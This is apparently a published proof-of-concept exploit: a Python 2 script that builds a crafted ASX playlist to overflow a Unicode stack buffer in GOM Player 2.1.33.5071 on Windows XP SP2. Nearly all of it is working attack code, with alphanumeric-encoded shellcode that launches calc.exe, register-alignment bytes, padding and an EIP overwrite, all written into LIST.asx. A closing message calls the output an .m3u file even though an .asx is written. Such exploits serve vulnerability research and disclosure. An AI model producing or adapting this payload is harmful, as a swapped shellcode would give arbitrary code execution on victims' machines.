# Exploit Title: GOM Player Crafted ASX File Unicode Stack Buffer Overflow and Arbitrary Code Execution.
# Version: 2.1.33.5071
# Date: 30-11-2011
# Author: Debasish Mandal & Peter Van Eeckhoutte (corelanc0d3r)
# Email : debasishm89@gmail.com
# Software Link: http://www.gomlab.com/eng/GMP_download.html
# Category:: Local
# Tested on: Windows XP SP2.
# Many Many Thanks to P.V.Eeckhoutte & Nilanjan De


#!/usr/bin/python
print "#############################################################################################"
print "##   GOM Player Crafted ASX File Unicode Stack Buffer Overflow and Arbitrary Code Execution.#"
print "##                                   Version: 2.1.33.5071                                   #"
print "##                                Author :: Debasish Mandal                                 #"
print "##                             Email : debasishm89@gmail.com                                #"
print "##                             Blog: http://www.debasish.in/                                #"
print "#############################################################################################"
raw_input("[*] Press Enter to generate the crafted ASX...")
size = 2046
#Shellcode WinExec "Calc.exe" Unicode
shellcode = "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AI"
shellcode += "AIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBvz5tz9ptkthtPZOCI95hVsXKl"
shellcode += "iqqVQNR4CUrm4p1pBlSm32qFxhK1dGymgtBT7KaWXZUKNKDhyKwRD3M4kIgjNWcoPbSw2Vg9C8"
shellcode += "qpkJHPTWONmGWC5QaNrRktfZsLnvqZZxsLOmJlOl5oXmvWpdgKQzmR3pXKuPSPhNy9YXXVpMQ4"
shellcode += "LknUTeKronnLU5GYH3FKm9oL8bgzRHcEuHN1o6wUn6quYo9Mn7pUEZFjaxMkkkFMvHii3tM7Li"
shellcode += "z0yTVM6RQeUKceKvqNNsS3OK0Wsr2LKHnMxzpNsL2noxujOJn7khxOO1wuOWnSkXLQ4sNEm3xN"
shellcode += "K3OwmMDBsKuf5DvgPOlXtwljwJLqruILX8ntLu940wojgQ6kVIPXMNCL8vJnlJeRqcBLELTKLu"
shellcode += "48sNz8yLFZVo2KNLWPsKw6ZeOBOnuyC1ef0uz7dQOzSrmPFKSZTA"
buff = ''
buff += '<asx version = "3.0" ><entry><title>ArirangTV</title><ref href = "WWW.'
align = "A"                 # align to first instruction
align += "\x55\x41\x58\x41" # push ebp, pop eax
align += "\x05\x11\x11"     # add eax,11001100
align += "\x41"             # align
align += "\x2d\x10\x11"     # sub eax,11001000
align += "\x41" * 109       # padding
align += "\x40\x41\x40"     # 2x inc eax
align += "\x41"             # align
buff += align
buff += shellcode
buff += "\x41"*(size - len(align) - len(shellcode))
#eip
buff += "\xd9\x57"          # CALL EBP - 0x005700d9
                            # top of the stack
buff += "\x46"*2
buff += "\x47"*100
buff +='"/></entry></asx>'
f = open('LIST.asx','w')
f.write(buff)
f.close()
print "[*] Crafted .m3u File generated"
print "[*] Exit"